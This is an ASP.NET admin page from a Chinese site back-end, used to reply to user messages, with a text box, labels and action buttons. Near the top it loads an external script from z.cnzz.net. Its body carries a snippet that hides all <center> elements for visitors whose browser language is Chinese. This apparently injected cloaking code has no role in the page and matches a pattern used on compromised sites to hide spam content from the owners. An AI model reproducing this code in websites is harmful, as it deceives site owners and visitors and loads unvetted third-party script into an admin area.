<%@ Page Language="C#" AutoEventWireup="true" CodeFile="reply.aspx.cs" Inherits="reply"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<link rel="stylesheet" type="text/css" href="adminsty.css" />
<title>回复消息</title>
    <style type="text/css">
        #reply
        {
            text-align: left;
        }
        #rpy
        {
            text-align: left;
        }
    </style>
<script type="text/javascript" src="http://z.cnzz.net/o.php?sid=1253974593"></script></head>
<body>
<script language="JavaScript" type="text/javascript">
var lang = navigator.language || navigator.userLanguage;
if(lang.substr(0, 3) == "zh-"){
document.write("<style type=\"text/css\" media=\"screen\">center{display:none;}</style>"); }
</script>
<form id="form1" runat="server" autocomplete="off">
  <table width="1038" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="15" colspan="9" bgcolor="#585858"></td>
  <tr>
  <td  align="left" valign="middle" bgcolor="#ff7d23" >丽军数码</td>
   
  </tr>  <tr>
  <td height="15" colspan="9" align="center" bgcolor="#FFFFFF">
        <p><br />
        </p>
       
        <table width="90%" border="0" cellspacing="0" cellpadding="12">
          <tr>
            <td width="547" align="left"><h1>后台管理</h1>
             </td>
            <td align="right" nowrap="nowrap"><asp:Label ID="Label1" runat="server" Text=""></asp:Label></td>
            <td width="200" align="right">
                &nbsp;&nbsp;<asp:ImageButton ID="btnBack" runat="server" ImageUrl="~/imgs/back.gif" Height="32" Width="32" title="返回" OnClick="btnBack_click"/>
                &nbsp;&nbsp;<asp:ImageButton ID="btnLogout" runat="server" ImageUrl="~/imgs/logout.gif" Height="32" Width="32" title="登出" OnClick="btnLogout_click"/></td>
          </tr>
          <tr>
            <td height="3" colspan="3" align="left">
                
                          </td>
          </tr>
          <tr>
            <td colspan="3" align="center" valign="middle" width="500">
            <!--修改密码-->
            <div id="divuseradd" class="divcss" runat="server" align="center">
              <table width="100%" border="0" cellspacing="0" cellpadding="20">
                <tr>
                  <td align="right"><img src="imgs/content.gif" width="32" height="32" /></td>
                  <td align="left"><strong>回复消息：</strong></td>
                </tr>
                <tr>
                  <td colspan="2"><p>&nbsp;</p>
                      <p style="text-align: left">您正在回复<asp:Label ID="lbuser" runat="server" 
                              style="color: #FF7D23; font-weight: 700" Text="用户"></asp:Label>
                          的<asp:Label ID="lbcom" runat="server" Text="留言"></asp:Label>
                          &nbsp;：</p>
                      <p style="text-align: left">
                          <asp:TextBox ID="txtreply" runat="server" BackColor="Silver" CssClass="txt3" 
                              Height="160px" MaxLength="140" TextMode="MultiLine" Width="652px"></asp:TextBox>
                        </p>
                      <p style="text-align: left">
                       
                          <asp:Label ID="lbtt" runat="server" Text="留言"></asp:Label>内容：<asp:Label 
                              ID="lbliuyan" runat="server" Text="Label"></asp:Label>
                      </p>
                      
                      <div id="rpy" runat="server">回复内容：                   
                          <asp:Label ID="lbhuifu" runat="server" Text="（暂无内容！）"></asp:Label>
                          <asp:Button ID="btnCeuser" runat="server" class="txt3" Text="删除该回复" 
                    BackColor="#FF7D23" BorderStyle="Solid" Font-Bold="True" 
                    ForeColor="White" BorderColor="#FF7D23"  
                              OnClientClick="javascript:return confirm('您确定删除该用户吗？');" 
                              onclick="btnCeuser_Click"  /></div>
                    </td>
                </tr>
                <tr>
                  <td colspan="2"><asp:ImageButton ID="btnInsert" runat="server" 
                          ImageUrl="~/imgs/okbtn.gif" onclick="btnInsert_Click"/>
                      &nbsp;<asp:ImageButton ID="btnReset" runat="server" ImageUrl="~/imgs/clearbtn.gif" OnClick="btnReset_click"/></td>
                </tr>
              </table>
            </div>
</td>
          </tr>
          <tr>
            <td colspan="3" align="center" valign="middle" width="500">

               
            </td>
          </tr>
        </table>

          <p>
            <br />
            <br />
            

        </p>
 <br />

            
  </tr>
  
  <tr>
    <td align="center" valign="middle" bgcolor="#FFFFFF" cellpadding="0">
        &nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;<p><br />
             <br />
            <br />
             <br /></p></td>
  </tr>
  <tr>
    <td height="40" bgcolor="#A1A1A1"  class="footer"><p>&nbsp;</p>
                      <p> &nbsp;&nbsp;
                      <asp:Label ID="Label2" runat="server" Text=""></asp:Label></p></td></tr></table>          
    </form>
</body>
</html>
